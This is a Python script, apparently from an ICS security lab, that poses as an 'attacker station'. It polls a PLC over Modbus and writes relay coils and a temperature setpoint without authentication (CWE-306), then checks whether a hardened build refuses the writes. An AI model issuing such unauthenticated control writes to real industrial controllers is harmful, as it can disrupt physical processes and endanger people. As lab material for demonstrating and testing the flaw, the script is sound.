#!/usr/bin/env python3
"""Engineer / attacker station — a Modbus master on the plant network.

Shows what ANY node that can reach the controller's :502 can do: read the whole process
image, and (on the vulnerable build) write the controller with no authentication
(CWE-306). On the secure build the same writes are refused unless an operator is in
REMOTE. This is the network plane; the ladder's I²C is the bus plane — two paths to the
same points.

    python3 engineer.py read                 # poll the process + relays
    python3 engineer.py write-coil relay2 1   # command a relay over the network
    python3 engineer.py write-setpoint 321    # write reg30 -> %IW4 (feeds the logic)
"""
import os, sys, time
sys.path.insert(0, "/lib")
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "lib"))
from modbus import Modbus, wait_for, COILS, REGS

PLC = os.environ.get("PLC_HOST", "plc")

def main():
    cmd = sys.argv[1] if len(sys.argv) > 1 else "read"
    print("[engineer] station on the plant network; target controller %s:502" % PLC, flush=True)
    wait_for(PLC)
    mb = Modbus(PLC)
    if cmd == "read":
        while True:
            try:
                p = mb.process(); r = mb.relays()
                print("[engineer] READ  mode=%s  %.2fV %dmA %.1f°C  hb=%d  relays=%s"
                      % (p["mode"], p["vin_v"], p["current_ma"], p["temp_c"], p["heartbeat"],
                         "".join(str(r["relay%d" % i]) for i in range(4))), flush=True)
            except Exception as e:
                print("[engineer] read failed:", e, flush=True)
            time.sleep(2)
    elif cmd == "write-coil":
        name = sys.argv[2]; on = int(sys.argv[3]) if len(sys.argv) > 3 else 1
        addr = COILS[name]
        req, resp = mb.write_coil(addr, on)
        pdu = bytes.fromhex(resp)[7:]
        refused = (pdu[0] & 0x80)
        print("[engineer] WRITE coil %s(%d)=%d  req=%s resp=%s  -> %s"
              % (name, addr, on, req, resp,
                 ("REFUSED (secure build wants REMOTE)" if refused else "ACCEPTED — no auth required (CWE-306)")), flush=True)
    elif cmd == "write-setpoint":
        val = int(sys.argv[2]) if len(sys.argv) > 2 else 250
        req, resp = mb.write_reg(REGS["setpoint_tempx10"], val)
        pdu = bytes.fromhex(resp)[7:]
        refused = (pdu[0] & 0x80)
        back = mb.read_regs(REGS["setpoint_tempx10"], 1)[0]
        print("[engineer] WRITE reg30(setpoint)=%d  req=%s resp=%s  readback=%d  -> %s"
              % (val, req, resp, back, ("REFUSED" if refused else "ACCEPTED (feeds %IW4)")), flush=True)
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
